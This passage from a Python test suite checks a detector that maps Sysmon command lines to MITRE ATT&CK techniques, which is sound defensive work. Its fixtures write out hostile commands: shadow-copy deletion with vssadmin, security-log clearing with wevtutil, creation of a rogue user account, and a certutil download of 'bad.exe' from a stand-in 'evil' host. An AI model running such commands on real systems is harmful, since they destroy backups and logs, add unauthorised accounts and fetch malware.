    def test_copy_to_admin_share_benign_path_no_fire(self):
        # Plain C$ copies to ProgramData (WSUS/SCCM) should NOT fire T1570 —
        # we require a suspicious subpath like \Temp\, \Users\, \Windows\Tasks\
        payload = _base(
            commandLine="robocopy src \\\\\\\\HOST\\\\C$\\\\ProgramData\\\\SCCM"
        )
        translate_sysmon_event(payload)
        assert payload.get("_lateralMovementPipe") is not True

    def test_net_user_add_not_flagged_as_enum(self):
        # `net user evil P@ss /add` should be T1136 (create account), not
        # T1087.001 (local enumeration). Pattern excludes the `/add` form.
        payload = _base(commandLine="net user evil P@ss /add")
        translate_sysmon_event(payload)
        techs = payload["mitre"]["techniques"]
        assert "T1136.001" in techs
        assert "T1087.001" not in techs

    def test_get_mppreference_not_defender_tamper(self):
        # Get-MpPreference is read-only, shouldn't fire tamper flag
        payload = _base(commandLine="Get-MpPreference")
        translate_sysmon_event(payload)
        assert payload.get("_defenderTampered") is not True

    def test_sc_query_not_service_create(self):
        payload = _base(commandLine="sc.exe query WinDefend")
        translate_sysmon_event(payload)
        assert payload.get("_serviceCreated") is not True


# ─── TestTranslatorIntegration ─────────────────────────────────────────────

class TestTranslatorIntegration:
    """End-to-end tests covering the full translate_sysmon_event flow."""

    def test_non_sysmon_source_noop(self):
        payload = {
            "_sourceName": "Okta",
            "commandLine": "vssadmin delete shadows",  # would normally fire
        }
        added = translate_sysmon_event(payload)
        assert added == 0
        assert payload.get("_shadowCopyDeletion") is not True

    def test_empty_commandline_no_crash(self):
        payload = _base(commandLine="")
        added = translate_sysmon_event(payload)
        assert isinstance(added, int)

    def test_missing_commandline_no_crash(self):
        payload = {"_sourceName": "Sysmon"}
        added = translate_sysmon_event(payload)
        assert isinstance(added, int)

    def test_most_specific_technique_picked_as_flat(self):
        # If multiple techniques fire, `_mitreTechnique` picks the most
        # specific (longest) ID
        payload = _base(
            commandLine=(
                "powershell.exe -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA=="
            )
        )
        translate_sysmon_event(payload)
        # T1059.001 should be the flat value (more specific than T1059)
        assert payload["_mitreTechnique"] == "T1059.001"

    def test_mitre_techniques_is_sorted_list(self):
        payload = _base(
            commandLine="vssadmin delete shadows; wevtutil cl Security"
        )
        translate_sysmon_event(payload)
        techs = payload["mitre"]["techniques"]
        assert techs == sorted(techs)
        assert "T1070.001" in techs
        assert "T1490" in techs

    def test_existing_mitre_dict_merged_not_replaced(self):
        payload = _base(
            commandLine="vssadmin delete shadows",
            mitre={"techniques": ["T9999"]},
        )
        translate_sysmon_event(payload)
        techs = payload["mitre"]["techniques"]
        assert "T9999" in techs
        assert "T1490" in techs

    def test_lolbin_with_network_args_sets_lolbin_abuse(self):
        payload = _base(
            process="certutil.exe",
            commandLine="certutil.exe -urlcache -split -f https://evil/bad.exe"
        )
        translate_sysmon_event(payload)
        assert payload.get("_lolbinAbuse") is True

    def test_lolbin_without_network_args_no_lolbin_abuse(self):
        payload = _base(
            process="powershell.exe",
            commandLine="powershell.exe Get-Date"
        )
        translate_sysmon_event(payload)
        assert payload.get("_lolbinAbuse") is not True

    def test_idempotent_re_translation(self):
        # Running translate twice should produce the same final state
        payload = _base(commandLine="vssadmin delete shadows")
        translate_sysmon_event(payload)
        first_snapshot = dict(payload)
        translate_sysmon_event(payload)
        # Booleans and techniques should be unchanged
        assert payload["_shadowCopyDeletion"] == first_snapshot["_shadowCopyDeletion"]
        assert payload["mitre"]["techniques"] == first_snapshot["mitre"]["techniques"]

    def test_eid_fork_runs_when_commandline_empty(self):
        # Sysmon EID 10 rarely has a command line; event-ID fork must still fire
        payload = {
            "_sourceName": "Sysmon",
            "_sourceEventId": 10,
            "_targetImage": "C:\\Windows\\System32\\lsass.exe",
        }
        translate_sysmon_event(payload)
        assert payload.get("_lsassAccess") is True
        assert "T1003.001" in payload["mitre"]["techniques"]
